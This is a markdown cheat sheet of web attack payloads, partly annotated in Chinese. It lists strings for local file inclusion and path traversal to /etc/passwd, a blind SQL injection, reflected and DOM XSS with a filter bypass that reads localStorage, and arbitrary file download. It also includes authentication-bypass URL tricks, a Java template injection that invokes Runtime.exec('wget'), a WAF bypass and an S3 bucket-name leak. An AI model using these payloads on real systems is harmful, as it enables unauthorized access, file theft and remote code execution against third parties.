# Payloads

LFI

```
Java
netdoc:///etc/passwd
netdoc://xxx/etc/passwd
jar:http://localhost!/
jar:ftp://attack.com!/
jar:proto-schema://domain!/

PHP
http://example.com/page.php?page=\\1.1.1.1\test.txt

IOT
http://IP/fs/../../tmp/dropbear/dropbearpwd

APISIX
http://IP/public-service/../protected-service/protected
http://IP/public-service/..%2Fprotected-service/protected
```

SQLI

```
无逗号时间盲注
xxx'-cast((select CASE WHEN ((MY_QUERY) like 'CHAR_TO_BRUTE_FORCE%25') THEN (sleep(1)) ELSE 2 END) as char)-'
```

Reflected XSS

```
<a:script xmlns:a="http://www.w3.org/1999/xhtml">alert(1337)</a:script>
```

DOM XSS

```
绕过双引号转义，用结尾的 // 和前面的 }} 闭合 function()
\"}})})-confirm`1`(a=>{({b:{/*///

来自 https://github.com/oskarsve/ms-teams-rce/blob/main/README.md
"angular expression filtering can be bypassed by injecting a nullbyte char in unicode \u0000"
{{['if(typeof onetime==`undefined`){onetime=1;console.log(localStorage);}'].forEach($root.$$childHead.$$nextSibling.app.$window.eval)}\u0000}
```

AFD

```
/manage/log/view?filename=/etc/passwd&base=../../../../../
/utility/download.aspx?f=.+./utility/download.aspx
file:///c:/windows/system32/cmd.exe /c calc
abc.exe\..\
```

Redirect

```
target.com/admin         –> HTTP 302 (redirect to login page)
target.com/admin%20/     -> HTTP 200 OK
target.com/Admin/        -> HTTP 200 OK
target.com/%20admin%20/  -> HTTP 200 OK
target.com/admin%20/page -> HTTP 200 OK

/jk-status;              -> Auth required
/jk-status;?cmd=dump     -> No authentication
```

Java Template Injection

```
https://cyc10n3.medium.com/rce-via-server-side-template-injection-ad46f8e0c2ae
${("".getClass()).forName("java.lang".concat("Runtime")).getMethods()[6].invoke(("".getClass()).forName("java.lang".concat("Runtime"))).exec("wget")}
```

WAF

```
替换VERB绕过
XXX /test.php?id=INJECTION HTTP/1.1
```

# App specific

S3 Bucket

```
来自 https://medium.com/@localh0t/unveiling-amazon-s3-bucket-names-e1420ceaf4fa，爆出 bucket 名字
https://example.com/avatars/123%C0
```

Joomla

```
example.com/components/
```

